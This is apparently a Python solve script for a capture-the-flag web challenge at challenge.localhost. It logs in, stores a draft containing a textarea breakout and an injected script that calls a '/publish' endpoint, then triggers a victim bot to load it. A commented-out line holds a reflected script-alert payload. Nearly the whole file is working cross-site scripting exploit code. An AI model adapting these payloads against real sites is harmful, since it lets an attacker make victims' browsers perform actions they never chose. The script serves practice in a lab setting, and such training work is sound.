#!/usr/bin/python3
import sys
import requests
from urllib.parse import quote,urlencode
from pwn import *

session = requests.Session()

url = "http://challenge.localhost/login"

data= {
"username":"hacker",
"password":"1337"
}

context.log_level = 'error'

#res = process(['/challenge/victim','http://challenge.localhost/?msg=%3C%2Ftextarea%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E'])

#res.interactive()
session.post(url,data = data)
d={
"content":"</textarea><script>fetch('http://challenge.localhost/publish')</script>",
"publish":"on"
}
session.post("http://challenge.localhost/draft",data=d)
import os
import time
os.system('/challenge/victim')
time.sleep(10)
print(session.post(url,data=data).text)
